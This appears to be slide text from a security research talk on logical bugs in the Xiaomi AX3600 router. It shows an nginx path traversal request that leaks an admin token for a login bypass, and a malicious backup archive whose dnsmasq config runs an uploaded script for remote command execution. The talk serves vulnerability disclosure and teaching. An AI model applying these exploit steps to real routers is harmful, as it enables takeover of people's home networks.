@M4x_1997
@zh_explorer
⚫ Beijing Chaitin Tech Co., Ltd(@ChaitinTech)
https://chaitin.cn/en
https://realworldctf.com/
⚫ Chaitin Security Research Lab
⚫ Pwn2Own 2017 3rd place
⚫ GeekPwn 2015/2016/2018/2019 awardees
⚫ PS4 Jailbreak, Android rooting, IoT Offensive Research, ESXi Escape
⚫ CTF players from team b1o0p, Tea Deliverers
⚫ 2nd place at DEFCON 2016
⚫ 3rd place at DEFCON 2019
⚫ 1st place at HITCON 2019
⚫ 4st place at DEFCON 2020
⚫ Ranks 422nd on the Fortune Global 500 list for 2020
⚫ Hosts the world’s largest IoT platform
⚫ Xiaomi today has more than 235 million connected 
devices
⚫ Released on February 13, 2020
⚫ The first router to support Wi-Fi 6 of 
Xiaomi
⚫ 599
/ 99$
⚫
Wi-Fi 6
⚫ A logical error is a bug in a program that causes it to operate incorrectly, but not to terminate 
abnormally (or crash)
⚫ Logical bugs are hard to find but relatively easy to exploit
⚫ We will elaborate more by examples
⚫ Web server
80/8080/8098/8999
⚫ DNS (53)
⚫ Other protocol
784
Nmap scan report for 192.168.31.1
Host is up (0.0052s latency).
Not shown: 65528 closed ports
PORT STATE SERVICE VERSION
53/tcp open domain ISC BIND 9.11.3-1ubuntu1.12 (Ubuntu Linux)
80/tcp open http nginx 1.12.2
784/tcp open unknown
8080/tcp open http nginx 1.12.2
8098/tcp open http nginx 1.12.2
8999/tcp open http nginx 1.12.2
⚫ Web server
80/8080/8098/8999
⚫ DNS (53)
⚫ Other protocol
784
A little spoiler alert:
All web functions are completed in lua. And most luac files 
are encrypted in Xiaomi’s own format.
Common ways:
⚫ Dump the flash
sniffer from network traffic when updating
⚫ get a shell from serial connection
ssh/telnet
Nday/0day attack etc.
⚫ Social engineering, especially for Xiaomi IoT devices
http://miwifi.com/miwifi_download.html
Seems it’s a UBI image, but we 
encounter the error when 
trying to extract it using 
ubi_reader
Reading the code of ubi_reader, we 
find there is an extra data block at 
the end of the image.
Ps: this issue is fixed in commit 
63105
Now we have firmware ☺
alias defines a replacement for the 
specified location
GET /backup/log../secretFile HTTP/1.1
Host: 192.168.31.1
GET /tmp/syslogbackup/../secretFile HTTP/1.1
Host: 192.168.31.1
GET /tmp/secretFile HTTP/1.1
Host: 192.168.31.1
So we can read files under /tmp directory
But the path 
traversal is limited 
to /tmp
So what can we read under 
/tmp?
/tmp/messages stores lots 
of logs.
The most appealing data 
is the stok string, which is 
an access token for admin 
page.
/tmp/messages stores lots 
of logs.
The most appealing data 
is the stok string, which is 
an access token for admin 
page.
Login Bypass!
Fix: Add a single / will mitigate 
this vulnerability
⚫ Hardware debugging interface like UART
⚫ Repack && write back firmware
⚫ ssh/telnet, Nday/0day attack etc.
No shell, only log
We use a 0day(CVE-2020-????). 
It’s not fixed yet, so we won’t show the details.
BV1es411D7sW
Translation for non-Chinese 
speakers:
Restore router settings from 
backup
chaitin@chaitin:~$ ls
2020-07-07--18_43_51.tar.gz
chaitin@chaitin:~$ tar xvf 2020-07-07--18_43_51.tar.gz
cfg_backup.des
cfg_backup.mbu
chaitin@chaitin:~$ file *
2020-07-07--18_43_51.tar.gz: gzip compressed data, max compression, from Unix
cfg_backup.des:
ASCII text, with no line terminators
cfg_backup.mbu:
data
chaitin@chaitin:~$ cat cfg_backup.des
["mi_basic_info","mi_network_info","mi_wifi_info","mi_lan_info","mi_arn_info"]
chaitin@chaitin:~$ cat cfg_backup.mbu
k^Lj'5V
Ucɟ/һPiP
)vnaDG0W"5
……
A regular backup file for AX3600
添加标题
A natural assumption of the unpack 
procedure
添加标题
Q: Can we upload a webshell?
A: No. We can only upload .tar.gz file. The archive 
will be uploaded to /tmp directory and renamed 
as cfgbackup.tar.gz
添加标题
Q: Is there a path traversal issue?
A: We tried, but failed.
添加标题
Q: is there any interesting filed in 
the .mbu file?
A: Clearly it’s encrypted. But the 
decrypt details are in the 
encrypted luac files. It seems a 
dead end at least for now.
添加标题
Brainstorming
Nothing fun happens when things go well, 
but what if these steps don’t go as 
supposed?
添加标题
Attackers make no difference if can’t even 
upload a file to the victim(router)
And the procedure won’t continue if the 
unpack step fails, so we must upload a 
completely valid .tar.gz archive
添加标题
I don’t see there is a chance if it’s a 
completely valid .tar.gz file
Besides, the archive will be removed 
immediately if unpack fails.
添加标题
But we can control the files in the archive, 
although with some limitation (first sight: 
filename must be ended with .mbu or .des)
chaitin@chaitin:~$ cat test.des
I'm still here!
chaitin@chaitin:~$ tar tvf test.tar.gz
-rwxrwxrwx chaitin/chaitin
16 2020-07-09 16:25 test.des
/tmp # ls -l test.des
-rwxrwxrwx
1 1000 
1000
16 Jul
9 16:25 test.des
/tmp # cat test.des
I'm still here!
A trival issue:
If the following steps fails, the archive will be removed, but not the files in the archive, which  brings 
a side effect, we can upload a content-controlled file to /tmp, with some limitations with filename.
What more can we do?
chaitin@chaitin:~$ cat new_dir/test.des
I shouldn't be here!
chaitin@chaitin:~$ tar tvf test.tar.gz
-rwxrwxrwx chaitin/chaitin
21 2020-07-09 16:31 new_dir/test.des
/tmp # ls -l new_dir/test.des
-rwxrwxrwx
1 1000 
1000
21 Jul
9 16:31 new_dir/test.des
/tmp # cat new_dir/test.des
I shouldn't be here!
⚫ upload a content-controlled file to /tmp, with some limitations with filename
⚫ upload the file to /tmp/some_dir
Can we break the limitation?
How is this check realized?
filename.endswith("des")
filename.contains("des")
OR
/tmp # ls -l des.xyz
-rwxrwxrwx
1 1000 
1000
14 Jul
9 16:38 des.xyz
/tmp # cat des.xyz
I have "des"!
⚫ upload a content-controlled file to /tmp, with some little limitations with filename
⚫ upload the file to /tmp/some_dir
/tmp # find . -type d
.
……
./spool/cron
……
./dnsmasq.d
……
./lib/nginx
……
./etc/config
……
Select a target…
/tmp # find . -type d
.
……
./spool/cron
……
./dnsmasq.d
……
./lib/nginx
……
./etc/config
……
/tmp/spool/cron (symbolic to /var/spool/cron) is a great target, but crontab files must be named after 
accounts in /etc/passwd,  while we still have little limitation with filenames 
/tmp # find . -type d
.
……
./spool/cron
……
./dnsmasq.d
……
./lib/nginx
……
./etc/config
……
root@XiaoQiang:~# ps w | grep dnsmasq
5411 root 1300 S /usr/sbin/dnsmasq --user=root -C 
/var/etc/dnsmasq.conf.cfg01411c -k -x /var/run/dnsmasq/dnsmasq.cfg01411c
……
root@XiaoQiang:~# cat /var/etc/dnsmasq.conf.cfg01411c
……
conf-dir=/tmp/dnsmasq.d
……
root@XiaoQiang:~#
dnsmasq will load all .conf files in conf-dir when start. So we can drop 
our files to /tmp/dnsmasq.d!
But how to restart dnsmasq?
Easy! Any modification of network will restart this service.
chaitin@chaitin:~$ tar tvf exploit.tar.gz
-rwxrwxrwx chaitin/chaitin
54 2020-07-09 17:03 hackdes.sh
-rwxrwxrwx chaitin/chaitin
91 2020-04-27 11:53 dnsmasq.d/mbu.conf
/tmp # cat /tmp/hackdes.sh
#!/bin/sh
echo "hacked by chaitin!" > /tmp/hacked
/tmp # cat /tmp/dnsmasq.d/mbu.conf
enable-tftp
tftp-root=/etc
tftp-no-fail
tftp-no-blocksize
dhcp-script=/tmp/hackdes.sh
chaitin@chaitin:~$ tar tvf exploit.tar.gz
-rwxrwxrwx chaitin/chaitin
54 2020-07-09 17:03 hackdes.sh
-rwxrwxrwx chaitin/chaitin
91 2020-04-27 11:53 dnsmasq.d/mbu.conf
/tmp # cat /tmp/hackdes.sh
#!/bin/sh
echo "hacked by chaitin!" > /tmp/hacked
/tmp # cat /tmp/dnsmasq.d/mbu.conf
enable-tftp
tftp-root=/etc
tftp-no-fail
tftp-no-blocksize
dhcp-script=/tmp/hackdes.sh
Remote Command Execution!
Quick Q & A
⚫ Except set the dhcp-script, why bothers to enable tftp?
⚫ To trigger the script.
-6 --dhcp-script=
Whenever a new DHCP lease is created, or an old one destroyed, or a 
TFTP file transfer completes, the executable specified by this option is run.
From http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
⚫ Can we upload malicious files through tftp?
⚫ No, we can only read file using dnsmasq’s tftp
The philosopy was to implement just enough of TFTP to do network boot, aiming 
for security and then simplicity. Hence no write operation: it's not needed 
for network booting, and it's not secure. 
From http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2010q1/003558.html
⚫ There is a similar feature named dhcp-luascript, can we manipulate this?
⚫ For dnsmasq on AX3600, it’s not supported.
root@XiaoQiang:~# dnsmasq -v
Dnsmasq version 2.80 Copyright (c) 2000-2018 Simon Kelley